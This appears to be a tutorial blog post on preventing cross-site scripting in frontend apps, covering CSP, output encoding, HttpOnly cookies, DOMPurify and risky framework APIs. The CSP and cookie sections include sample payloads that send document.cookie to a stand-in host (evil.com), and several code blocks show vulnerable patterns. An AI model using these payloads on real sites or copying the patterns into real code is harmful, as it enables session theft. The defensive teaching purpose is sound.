# XSS Prevention in Frontend

Your app can have the slickest UI, the fastest API, and perfect test coverage. But if a user can paste `<script>alert('xss')</script>` into a comment box and have it execute—none of that matters. You've got a Cross-Site Scripting (XSS) vulnerability, and someone *will* exploit it.

XSS is still one of the most common web security flaws, and it's entirely preventable. Let's talk about what it actually looks like and how to shut it down.

---

## The Three Flavors of XSS

Before jumping into fixes, it's worth knowing what you're up against:

| Type | How It Works | Example |
|------|-------------|---------|
| **Stored XSS** | Malicious script saved on the server, served to every visitor | A comment with `<script>` that renders on page load |
| **Reflected XSS** | Script comes from the current request (URL, form input) | `?q=<script>steal_cookies()</script>` in search results |
| **DOM-based XSS** | Client-side JS writes untrusted data to the DOM unsafely | `location.hash` fed directly into `innerHTML` |

Stored XSS is the most dangerous because it hits everyone who views the page. DOM-based is the trickiest to catch because no malicious data ever touches the server—it's purely a client-side issue.

---

## Where Most XSS Happens

The root cause is almost always the same: **rendering untrusted data as HTML** without escaping it. Here's what that looks like in practice:

### ❌ Dangerous Patterns

```javascript
// Directly injecting user input into the DOM
document.getElementById('output').innerHTML = userComment;

// Using eval-like mechanisms
const template = `<div>${userInput}</div>`;
element.innerHTML = template;

// React's escape hatch misuse
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// jQuery convenience methods
$('#output').html(userComment);
```

These all bypass the browser's built-in defense mechanisms. When you use `innerHTML`, you're telling the browser: "trust me, this HTML is safe." But unless you've sanitized it properly, you're lying.

### ✅ Safe Alternatives

```javascript
// Use textContent instead of innerHTML when you don't need HTML
document.getElementById('output').textContent = userComment;

// React handles this by default—JSX auto-escapes
<div>{userInput}</div>  // ✅ safe, no HTML interpretation

// Vue, same deal
<div>{{ userInput }}</div>  // ✅ safe

// When you absolutely need HTML, sanitize first
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userComment);
```

The key insight: **modern frameworks auto-escape by default**. The danger comes from the escape hatches they give you. `dangerouslySetInnerHTML` in React and `v-html` in Vue aren't named that way by accident.

---

## Content Security Policy (CSP): Your Safety Net

Even if you make a mistake, CSP can save you. It's an HTTP header that tells the browser what sources of content are allowed to execute:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

This blocks:
- Inline `<script>` tags
- `eval()` and similar
- Scripts from external domains not on the allowlist
- Event handlers like `onclick="..."` in HTML attributes

Let's see it in action:

### Without CSP
```html
<!-- This executes if unsafely rendered -->
<img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

### With CSP `script-src 'self'`
```html
<!-- The onerror handler won't fire—blocked by CSP -->
<img src="x" onerror="...">
```

CSP isn't a silver bullet. It takes effort to configure correctly, and you'll inevitably discover inline scripts you need to allow. Use `Content-Security-Policy-Report-Only` first to test without blocking.

### CSP Levels

| Level | What It Adds | Caveat |
|-------|-------------|--------|
| **1** | Block inline scripts, restrict sources | Easy to bypass with JSONP endpoints |
| **2** | Hash/nonce-based inline script allowlisting | Requires server-side nonce generation |
| **3** | `strict-dynamic` for modern apps | Drops allowlist-based CSP for dynamically-loaded scripts |

---

## Context-Specific Encoding

One mistake I see often: devs HTML-escape everything and call it a day. But XSS context matters. Here's what I mean:

```javascript
// User input: "javascript:alert('xss')"

// ❌ Escaping for HTML context, but inserting into a URL
<a href="{userInput}">Click me</a>
// This executes when clicked! HTML escaping didn't help.

// ✅ URL-encode for URL contexts
<a href="{encodeURI(userInput)}">Click me</a>
```

Different contexts need different encoding:

| Context | Encoding Method | Example |
|---------|----------------|---------|
| HTML body | HTML entity encode | `& < > "` → `&amp; &lt; &gt; &quot;` |
| HTML attribute | Attribute encode | Quote-breaking characters |
| URL/URI | URL percent-encode | `javascript:` → neutralized |
| JavaScript string | JS string escape | Backslash-escape special chars |

The framework typically handles HTML body context. The tricky ones are URLs, inline event handlers, and `<style>` blocks—frameworks don't always save you there.

---

## HttpOnly Cookies: Minimize the Blast Radius

XSS often targets cookies—specifically session cookies. If an attacker can read `document.cookie`, they can hijack sessions. **HttpOnly** cookies can't be read by JavaScript at all:

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

This doesn't prevent XSS, but it limits the damage. Even if someone injects `<script>document.location='https://evil.com/?'+document.cookie</script>`, the session cookie won't be in the payload.

What *can* still be stolen:
- CSRF tokens stored in cookies
- Auth tokens in local/session storage
- Form data filled in by the user

So HttpOnly is a layer, not a solution.

---

## DOMPurify: The Sanitizer You Need

When you *must* render user-supplied HTML (rich text editors, markdown previews, email renders), don't write your own sanitizer. Use DOMPurify:

```javascript
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirtyInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href', 'title'],
});

// DOMPurify strips everything else—no scripts, no event handlers, no SVG exploits
```

**What makes DOMPurify good:** It runs in the browser, uses the actual DOM parser, and removes anything suspicious. It's battle-tested against mutation XSS (mXSS) attacks that trick regex-based sanitizers.

### But Sanitization Has Costs

- **It modifies user content.** A user's carefully crafted post might lose formatting.
- **It's not free.** On large documents, sanitization can block the main thread.
- **It can't fix bad framework usage.** If you're using `dangerouslySetInnerHTML` with unsanitized data, even DOMPurify can't help if you forget to call it.

---

## The React/Vue/Angular Specific Gotchas

Each framework has its own XSS-prone APIs. Knowing them is half the battle:

### React
```jsx
// ❌ Obvious danger
<div dangerouslySetInnerHTML={{ __html: props.comment }} />

// ❌ href with javascript: protocol
<a href={userProvidedUrl}>Link</a>

// ❌ Using user data in href without validation
<iframe src={userProvidedUrl} />
```

**React auto-escapes JSX expressions, but not these attributes.** A URL like `javascript:alert(1)` in an `<a href>` is valid HTML and will execute.

### Vue
```vue
<!-- ❌ Same pattern, different name -->
<div v-html="userComment"></div>

<!-- ❌ Dynamic href -->
<a :href="userUrl">{{ label }}</a>
```

### Angular
```typescript
// ❌ BypassSecurityTrustHtml is the escape hatch
this.sanitizer.bypassSecurityTrustHtml(userInput);

// ❌ Using innerHTML in Angular
elementRef.nativeElement.innerHTML = userInput;
```

The pattern is clear: these APIs exist for legitimate use cases (rendering trusted HTML). The problem is using them with data that came from users without going through a sanitizer first.

---

## What You Should Actually Do

XSS prevention isn't one thing—it's layers:

1. **Trust your framework's default escaping.** JSX, Vue templates, and Angular's sanitizer handle HTML body context fine. Don't opt out unless you really need to.

2. **Always sanitize before using escape hatches.** `dangerouslySetInnerHTML` + DOMPurify is safe. `dangerouslySetInnerHTML` + raw user input is a vulnerability.

3. **Set a strict CSP.** Even if you make mistakes, CSP catches what falls through. Start with `Report-Only` mode and iterate.

4. **Use HttpOnly + Secure + SameSite cookies.** Minimize what XSS can steal.

5. **Validate URLs and protocols server-side too.** Client-side validation is nice; server-side enforcement is mandatory. Strip `javascript:`, `data:`, and `vbscript:` protocols unless explicitly needed.

6. **Avoid `eval()` and its friends.** `eval()`, `new Function()`, `setTimeout(string)`, and `document.write()` are all XSS vectors. Lint against them.

7. **Test with actual XSS payloads.** Tools like OWASP ZAP can automate this. Don't assume you're safe because you "used React."

---

### Trade-off to Keep in Mind

The safer your app is against XSS, the more constrained your developers feel. Strict CSPs break inline scripts. Disabling `eval()` breaks source maps in development. HttpOnly cookies complicate client-side auth flows.

That's fine. Security should be mildly inconvenient for developers and invisible to users. If your CSP setup is annoying to configure, that's a sign it's working.
